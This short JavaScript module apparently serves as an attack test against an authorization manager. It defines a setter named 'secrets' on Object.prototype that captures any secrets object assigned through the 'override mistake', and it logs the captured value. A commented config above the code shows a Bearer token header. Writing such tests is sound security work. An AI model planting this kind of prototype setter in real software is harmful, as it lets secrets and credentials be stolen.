  /* {
    'www.google.com': {
      headers: {
        Authorization: 'Bearer ANY_SECRET'
      },
      method: 'GET'
    }
  } */

let stolen;

// grab all secrets, because of override mistake
Object.defineProperty(Object.prototype, "secrets", {
  set: (v) => {
    stolen = v;
  },
});

export const attack = (authzManager, success) => {
  if (stolen) {
    console.log('stolen', stolen);
  }
};
